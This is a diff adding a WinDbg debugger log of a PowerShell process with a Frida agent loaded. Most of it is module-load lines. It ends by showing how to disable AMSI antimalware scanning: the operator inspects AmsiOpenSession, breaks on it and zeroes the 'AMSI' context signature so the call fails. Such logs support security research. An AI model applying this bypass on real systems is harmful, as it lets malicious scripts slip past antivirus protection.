@@ -1,0 +1,178 @@
+
+************* Preparing the environment for Debugger Extensions Gallery repositories **************
+   ExtensionRepository : Implicit
+   UseExperimentalFeatureForNugetShare : true
+   AllowNugetExeUpdate : true
+   NonInteractiveNuget : true
+   AllowNugetMSCredentialProviderInstall : true
+   AllowParallelInitializationOfLocalRepositories : true
+   EnableRedirectToChakraJsProvider : false
+
+   -- Configuring repositories
+      ----> Repository : LocalInstalled, Enabled: true
+      ----> Repository : UserExtensions, Enabled: true
+
+>>>>>>>>>>>>> Preparing the environment for Debugger Extensions Gallery repositories completed, duration 0.000 seconds
+
+************* Waiting for Debugger Extensions Gallery to Initialize **************
+
+>>>>>>>>>>>>> Waiting for Debugger Extensions Gallery to Initialize completed, duration 0.297 seconds
+   ----> Repository : UserExtensions, Enabled: true, Packages count: 0
+   ----> Repository : LocalInstalled, Enabled: true, Packages count: 42
+
+Microsoft (R) Windows Debugger Version 10.0.27704.1001 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+
+************* Path validation summary **************
+Response                         Time (ms)     Location
+Deferred                                       srv*
+Symbol search path is: srv*
+Executable search path is: 
+ModLoad: 00007ff7`4a6c0000 00007ff7`4a731000   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ModLoad: 00007ffe`d1cf0000 00007ffe`d1ee5000   C:\Windows\SYSTEM32\ntdll.dll
+ModLoad: 00007ffe`d0790000 00007ffe`d084e000   C:\Windows\System32\KERNEL32.DLL
+ModLoad: 00007ffe`cf790000 00007ffe`cfa59000   C:\Windows\System32\KERNELBASE.dll
+ModLoad: 00007ffe`d0bb0000 00007ffe`d0c4e000   C:\Windows\System32\msvcrt.dll
+ModLoad: 00007ffe`d1630000 00007ffe`d16fd000   C:\Windows\System32\OLEAUT32.dll
+ModLoad: 00007ffe`cfca0000 00007ffe`cfd3d000   C:\Windows\System32\msvcp_win.dll
+ModLoad: 00007ffe`cf690000 00007ffe`cf790000   C:\Windows\System32\ucrtbase.dll
+ModLoad: 00007ffe`d11a0000 00007ffe`d14f5000   C:\Windows\System32\combase.dll
+ModLoad: 00007ffe`c5ce0000 00007ffe`c5cfd000   C:\Windows\SYSTEM32\ATL.DLL
+ModLoad: 00007ffe`d0a80000 00007ffe`d0baa000   C:\Windows\System32\RPCRT4.dll
+ModLoad: 00007ffe`cfd70000 00007ffe`cff11000   C:\Windows\System32\USER32.dll
+ModLoad: 00007ffe`cfb10000 00007ffe`cfb32000   C:\Windows\System32\win32u.dll
+ModLoad: 00007ffe`d06e0000 00007ffe`d078c000   C:\Windows\System32\ADVAPI32.dll
+ModLoad: 00007ffe`d0c50000 00007ffe`d0ceb000   C:\Windows\System32\sechost.dll
+ModLoad: 00007ffe`cfd40000 00007ffe`cfd6b000   C:\Windows\System32\GDI32.dll
+ModLoad: 00007ffe`d1500000 00007ffe`d162a000   C:\Windows\System32\OLE32.dll
+ModLoad: 00007ffe`cf4f0000 00007ffe`cf5fb000   C:\Windows\System32\gdi32full.dll
+ModLoad: 00007ffe`99530000 00007ffe`99595000   C:\Windows\SYSTEM32\mscoree.dll
+ModLoad: 00007ffe`d1c20000 00007ffe`d1c50000   C:\Windows\System32\IMM32.DLL
+ModLoad: 00007ffe`cd330000 00007ffe`cd342000   C:\Windows\SYSTEM32\kernel.appcore.dll
+ModLoad: 00007ffe`cf460000 00007ffe`cf4e3000   C:\Windows\System32\bcryptPrimitives.dll
+ModLoad: 00007ffe`ccdd0000 00007ffe`cce6e000   C:\Windows\system32\uxtheme.dll
+ModLoad: 00007ffe`d19c0000 00007ffe`d1a69000   C:\Windows\System32\clbcatq.dll
+ModLoad: 00007ffe`cd530000 00007ffe`cdcc0000   C:\Windows\system32\windows.storage.dll
+ModLoad: 00007ffe`ced90000 00007ffe`cedbc000   C:\Windows\system32\Wldp.dll
+ModLoad: 00007ffe`b2430000 00007ffe`b24c0000   C:\Windows\System32\appresolver.dll
+ModLoad: 00007ffe`d1700000 00007ffe`d17ad000   C:\Windows\System32\SHCORE.dll
+ModLoad: 00007ffe`d1c50000 00007ffe`d1ca5000   C:\Windows\System32\SHLWAPI.dll
+ModLoad: 00007ffe`bf900000 00007ffe`bf95c000   C:\Windows\System32\Bcp47Langs.dll
+ModLoad: 00007ffe`cdf90000 00007ffe`cdfb9000   C:\Windows\System32\SLC.dll
+ModLoad: 00007ffe`cf2d0000 00007ffe`cf2fe000   C:\Windows\System32\USERENV.dll
+ModLoad: 00007ffe`cdf60000 00007ffe`cdf85000   C:\Windows\System32\sppc.dll
+ModLoad: 00007ffe`cafb0000 00007ffe`cb0a6000   C:\Windows\system32\PROPSYS.dll
+ModLoad: 00007ffe`cff30000 00007ffe`d066f000   C:\Windows\System32\shell32.dll
+ModLoad: 00007ffe`b0fc0000 00007ffe`b0fcd000   C:\Windows\System32\LINKINFO.dll
+ModLoad: 00007ffe`cf410000 00007ffe`cf45e000   C:\Windows\System32\CFGMGR32.dll
+ModLoad: 00007ffe`cf350000 00007ffe`cf36f000   C:\Windows\system32\profapi.dll
+ModLoad: 00007ffe`af9e0000 00007ffe`afa5d000   C:\Windows\System32\ntshrui.dll
+ModLoad: 00007ffe`cf300000 00007ffe`cf331000   C:\Windows\System32\SspiCli.dll
+ModLoad: 00007ffe`c86a0000 00007ffe`c86c8000   C:\Windows\System32\srvcli.dll
+ModLoad: 00007ffe`bca10000 00007ffe`bca22000   C:\Windows\SYSTEM32\cscapi.dll
+ModLoad: 00007ffe`c9e50000 00007ffe`c9ef0000   C:\Windows\SYSTEM32\policymanager.dll
+ModLoad: 00007ffe`ce500000 00007ffe`ce58a000   C:\Windows\system32\msvcp110_win.dll
+ModLoad: 00007ffe`cf660000 00007ffe`cf687000   C:\Windows\System32\bcrypt.dll
+ModLoad: 00007ffe`ce100000 00007ffe`ce133000   C:\Windows\SYSTEM32\ntmarta.dll
+ModLoad: 00007ffe`af6a0000 00007ffe`af81e000   C:\Windows\System32\TaskFlowDataEngine.dll
+ModLoad: 00007ffe`cb270000 00007ffe`cb3c4000   C:\Windows\SYSTEM32\wintypes.dll
+ModLoad: 00007ffe`b3a70000 00007ffe`b3f11000   C:\Windows\System32\cdp.dll
+ModLoad: 00007ffe`cfb40000 00007ffe`cfc96000   C:\Windows\System32\CRYPT32.dll
+ModLoad: 00007ffe`cf1b0000 00007ffe`cf1c2000   C:\Windows\System32\UMPDC.dll
+ModLoad: 00007ffe`cb130000 00007ffe`cb26f000   C:\Windows\System32\dsreg.dll
+ModLoad: 00007ffe`cece0000 00007ffe`cecf8000   C:\Windows\SYSTEM32\cryptsp.dll
+ModLoad: 00007ffe`bc700000 00007ffe`bc77d000   C:\Windows\System32\OneCoreCommonProxyStub.dll
+ModLoad: 00007ffe`99490000 00007ffe`9952b000   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+ModLoad: 00007ffe`c6540000 00007ffe`c654a000   C:\Windows\SYSTEM32\VERSION.dll
+ModLoad: 00007ffe`98ae0000 00007ffe`99483000   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+ModLoad: 00007ffe`989e0000 00007ffe`98aad000   C:\Windows\SYSTEM32\ucrtbase_clr0400.dll
+ModLoad: 00007ffe`98ad0000 00007ffe`98adc000   C:\Windows\SYSTEM32\VCRUNTIME140_1_CLR0400.dll
+ModLoad: 00007ffe`98ab0000 00007ffe`98acb000   C:\Windows\SYSTEM32\VCRUNTIME140_CLR0400.dll
+ModLoad: 00007ffe`973d0000 00007ffe`989dd000   C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\5983164f9d7f1ca6cc256f34d228e951\mscorlib.ni.dll
+ModLoad: 00007ffe`8f580000 00007ffe`9019e000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System\9027dc90269bbcb49452585e8fd17bdd\System.ni.dll
+ModLoad: 00007ffe`8eaf0000 00007ffe`8f575000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Core\2b182da489f9b37822e2d4bf64b05f89\System.Core.ni.dll
+ModLoad: 00007ffe`b9d70000 00007ffe`b9e19000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pb378ec07#\7cf602745cc8652307915f518fb6640b\Microsoft.PowerShell.ConsoleHost.ni.dll
+ModLoad: 00007ffe`ce470000 00007ffe`ce4a4000   C:\Windows\system32\rsaenh.dll
+ModLoad: 00007ffe`ced00000 00007ffe`ced0c000   C:\Windows\SYSTEM32\CRYPTBASE.dll
+ModLoad: 00007ffe`8ca70000 00007ffe`8eae8000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\59ff0c53e7fac9a6f022c0d69cc0ea2f\System.Management.Automation.ni.dll
+ModLoad: 00007ffe`d06d0000 00007ffe`d06d8000   C:\Windows\System32\psapi.dll
+ModLoad: 00007ffe`cf600000 00007ffe`cf660000   C:\Windows\System32\wintrust.dll
+ModLoad: 00007ffe`cef20000 00007ffe`cef32000   C:\Windows\SYSTEM32\MSASN1.dll
+ModLoad: 00007ffe`bbd20000 00007ffe`bbd39000   C:\Windows\SYSTEM32\amsi.dll
+ModLoad: 00007ffe`bbc90000 00007ffe`bbd13000   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MpOav.dll
+ModLoad: 00007ffe`b9b50000 00007ffe`b9bf0000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Mf49f6405#\b53ec6ece2f6013427fabd2d8658ea82\Microsoft.Management.Infrastructure.ni.dll
+ModLoad: 00007ffe`b99e0000 00007ffe`b9b46000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Management\ddf2feffd2da0015271d24e43815a606\System.Management.ni.dll
+ModLoad: 00007ffe`b9870000 00007ffe`b99d6000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dired13b18a9#\810e00b03bf2c098da8bd5bbdd0bf685\System.DirectoryServices.ni.dll
+ModLoad: 00007ffe`8c1c0000 00007ffe`8ca70000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Xml\3b9f8fe07bbf6d767e0e58d3ddc915de\System.Xml.ni.dll
+ModLoad: 00007ffe`bb430000 00007ffe`bb481000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Numerics\7991af772afd75974ff023e7689a12c7\System.Numerics.ni.dll
+ModLoad: 00007ffe`cdcd0000 00007ffe`cdcf3000   C:\Windows\SYSTEM32\gpapi.dll
+ModLoad: 00007ffe`c8190000 00007ffe`c837b000   C:\Windows\SYSTEM32\urlmon.dll
+ModLoad: 00007ffe`c7cf0000 00007ffe`c7fa0000   C:\Windows\SYSTEM32\iertutil.dll
+ModLoad: 00007ffe`ce8f0000 00007ffe`ce8fc000   C:\Windows\SYSTEM32\netutils.dll
+ModLoad: 00007ffe`8b830000 00007ffe`8c1b3000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Data\10c37b4ff1b240b5e32dc6f247178adb\System.Data.ni.dll
+ModLoad: 00007ffe`b6d60000 00007ffe`b70ca000   C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll
+ModLoad: 00007ffe`d0850000 00007ffe`d08bb000   C:\Windows\System32\WS2_32.dll
+ModLoad: 00007ffe`b9730000 00007ffe`b9863000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Configuration\302252dd4293035491b9fa11cc500619\System.Configuration.ni.dll
+ModLoad: 00007ffe`b9600000 00007ffe`b972f000   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+ModLoad: 00007ffe`b9590000 00007ffe`b95f2000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P6f792626#\90d425acd27419456b6957833780bd92\Microsoft.PowerShell.Security.ni.dll
+ModLoad: 00007ffe`b83c0000 00007ffe`b849b000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Transactions\5f4fb795a0c50872ccd3cc1e80311140\System.Transactions.ni.dll
+ModLoad: 00007ffe`b9d20000 00007ffe`b9d6f000   C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll
+ModLoad: 00007ffe`c31a0000 00007ffe`c31ac000   C:\Windows\SYSTEM32\secur32.dll
+ModLoad: 00007ffe`c4de0000 00007ffe`c4f28000   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MPCLIENT.DLL
+ModLoad: 00007ffe`909c0000 00007ffe`90bad000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.CSharp\6f578db46270fd91e9be9e4ff5c493f8\Microsoft.CSharp.ni.dll
+ModLoad: 00007ffe`8ab10000 00007ffe`8b82d000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P521220ea#\497a2da7c3837cd50a5ba1a51a199188\Microsoft.PowerShell.Commands.Utility.ni.dll
+ModLoad: 00007ffe`c5960000 00007ffe`c598d000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Confe64a9051#\eaabd2657cf528c57991f946ae6a8fd5\System.Configuration.Install.ni.dll
+ModLoad: 00007ffe`90780000 00007ffe`909b5000   C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pae3498d9#\615dce4350a1ce8df5bcfd51b009b213\Microsoft.PowerShell.Commands.Management.ni.dll
+ModLoad: 00007ffe`b8d10000 00007ffe`b8d8c000   C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dynamic\3546989e55947165b701ba221d65973e\System.Dynamic.ni.dll
+ModLoad: 00007ffe`84250000 00007ffe`8572c000   C:\Users\test\AppData\Local\Temp\frida-e98244176651927cfd50bc805d38effb\64\frida-agent.dll
+ModLoad: 00007ffe`ce7e0000 00007ffe`ce81b000   C:\Windows\SYSTEM32\IPHLPAPI.DLL
+ModLoad: 00007ffe`ce820000 00007ffe`ce8ec000   C:\Windows\SYSTEM32\DNSAPI.dll
+ModLoad: 00007ffe`b33e0000 00007ffe`b3407000   C:\Windows\SYSTEM32\WINMM.dll
+ModLoad: 00007ffe`cff20000 00007ffe`cff28000   C:\Windows\System32\NSI.dll
+ModLoad: 00007ffe`bfee0000 00007ffe`c0021000   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\diasymreader.dll
+(2398.12c8): Break instruction exception - code 80000003 (first chance)
+ntdll!DbgBreakPoint:
+00007ffe`d1d90860 cc              int     3
+0:017> dc 0x1fa76321130
+000001fa`76321130  49534d41 00000000 5c268ea0 000001fa  AMSI......&\....
+000001fa`76321140  5c46c230 000001fa 0000049a 00000000  0.F\............
+000001fa`76321150  00600056 00210024 6e515b0a 93000621  V.`.$.!..[Qn!...
+000001fa`76321160  434f5250 4f535345 52415f52 54494843  PROCESSOR_ARCHIT
+000001fa`76321170  55544345 413d4552 3436444d 00000000  ECTURE=AMD64....
+000001fa`76321180  00000000 00000000 6e5e5b07 91000769  .........[^ni...
+000001fa`76321190  554c4c41 53524553 464f5250 3d454c49  ALLUSERSPROFILE=
+000001fa`763211a0  505c3a43 72676f72 61446d61 00006174  C:\ProgramData..
+0:017> u amsi !AmsiOpenSession
+amsi!AmsiOpenSession:
+00007ffe`bbd23560 e9a3cb9914      jmp     00007ffe`d06c0108
+00007ffe`bbd23565 4885c9          test    rcx,rcx
+00007ffe`bbd23568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffe`bbd235ac)
+00007ffe`bbd2356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
+00007ffe`bbd23570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffe`bbd235ac)
+00007ffe`bbd23572 4883790800      cmp     qword ptr [rcx+8],0
+00007ffe`bbd23577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffe`bbd235ac)
+00007ffe`bbd23579 4883791000      cmp     qword ptr [rcx+10h],0
+0:017> u !AmsiOpenSession+0x4c L2
+amsi!AmsiOpenSession+0x4c:
+00007ffe`bbd235ac b857000780      mov     eax,80070057h
+00007ffe`bbd235b1 c3              ret
+0:017> bp amsi!AmsiOpenSession
+0:017> g
+Breakpoint 0 hit
+*** WARNING: Unable to verify checksum for C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\59ff0c53e7fac9a6f022c0d69cc0ea2f\System.Management.Automation.ni.dll
+amsi!AmsiOpenSession:
+00007ffe`bbd23560 e9a3cb9914      jmp     00007ffe`d06c0108
+0:006> dc rcx L1
+000001fa`76321130  49534d41                             AMSI
+0:006> ed rcx 0
+0:006> dc rcx L1
+000001fa`76321130  00000000                             ....
+0:006> g
+(2398.2a9c): CLR exception - code e0434352 (first chance)
+(2398.2a9c): CLR exception - code e0434352 (first chance)
+(2398.2a9c): CLR exception - code e0434352 (first chance)
+(2398.2a9c): CLR exception - code e0434352 (first chance)
+(2398.2a9c): CLR exception - code e0434352 (first chance)
+(2398.1af0): CLR exception - code e0434352 (first chance)
